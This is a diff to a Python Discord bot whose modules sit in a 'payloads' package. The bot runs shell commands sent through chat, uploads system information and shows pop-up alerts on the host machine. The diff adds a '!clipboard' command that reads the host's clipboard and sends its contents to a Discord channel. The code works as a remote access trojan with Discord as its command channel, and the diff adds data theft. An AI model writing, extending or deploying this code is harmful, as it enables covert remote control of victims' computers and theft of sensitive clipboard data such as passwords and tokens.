@@ -2,8 +2,9 @@ import os
 
 import discord
 
-from laozi.systeminfo import get_sys_info
-from laozi.messagebox import display_messagebox
+from laozi.payloads.systeminfo import get_sys_info
+from laozi.payloads.clipboard import get_clipboard
+from laozi.payloads.messagebox import display_messagebox
 
 
 def load_environment_variables(file_path="../.env"):
@@ -39,6 +40,8 @@ class DiscordBotClient(discord.Client):
             self.execute_shell_command(command[9:])
         elif command.startswith("!alert"):
             self.trigger_messagebox(command[7:])
+        elif command.startswith("!clipboard"):
+            await self.handle_clipboard(message.channel)
 
     async def handle_system_info(self, channel):
         system_info = get_sys_info()
@@ -50,6 +53,13 @@ class DiscordBotClient(discord.Client):
         await channel.send(f"```{basic_info}```")
         await channel.send(file=discord.File("detailed_sys_info.txt"))
         os.remove("detailed_sys_info.txt")
+
+    async def handle_clipboard(self, channel):
+        clipboard_content = get_clipboard()
+        if clipboard_content:
+            await channel.send(f"Clipboard content:\n```{clipboard_content}```")
+        else:
+            await channel.send("Clipboard is empty or unavailable.")
 
     @staticmethod
     def split_system_info(system_info):
